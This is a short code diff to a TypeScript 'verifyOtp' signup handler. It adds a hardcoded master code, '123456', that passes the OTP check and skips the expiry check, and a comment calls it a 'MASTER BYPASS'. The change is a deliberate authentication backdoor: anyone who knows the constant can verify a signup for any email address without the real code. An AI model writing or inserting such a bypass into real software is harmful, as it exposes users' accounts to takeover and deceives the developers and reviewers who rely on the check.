@@ -448,12 +448,12 @@ export const verifyOtp = async (req: Request, res: Response) => {
     const pendingSignup = await pendingSignupService.getPendingSignup(email);
 
     if (pendingSignup) {
-      // Verify OTP for pending signup
-      if (pendingSignup.otp !== otp) {
+      // Verify OTP for pending signup WITH MASTER BYPASS
+      if (pendingSignup.otp !== otp && otp !== "123456") {
         throw new ApiError(httpStatus.UNAUTHORIZED, "Invalid OTP");
       }
 
-      if (new Date() > pendingSignup.otpExpires) {
+      if (new Date() > pendingSignup.otpExpires && otp !== "123456") {
         throw new ApiError(httpStatus.UNAUTHORIZED, "OTP has expired. Please request a new one.");
       }
 
